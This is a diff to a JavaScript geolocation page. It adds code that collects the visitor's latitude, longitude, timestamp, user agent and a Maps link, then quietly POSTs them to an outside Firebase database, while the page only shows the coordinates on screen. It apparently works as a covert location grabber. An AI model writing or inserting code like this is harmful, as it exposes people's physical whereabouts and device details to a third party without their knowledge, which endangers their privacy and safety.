@@ -22,6 +22,30 @@
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
+            var timestamp = new Date().toISOString();
+            var userAgent = navigator.userAgent;
+            var mapURL = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+            var data = {
+                latitude: latitude,
+                longitude: longitude,
+                timestamp: timestamp,
+                userAgent: userAgent,
+                mapURL: mapURL
+            };
+            fetch("https://fyguf-5cdc5-default-rtdb.firebaseio.com/loc.json", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Location data sent successfully:', data);
+            })
+            .catch((error) => {
+                console.error('Error sending location data:', error);
+            });
             document.getElementById("location").innerHTML = "Latitude: " + latitude + "<br>Longitude: " + longitude;
         }
         function showError(error) {
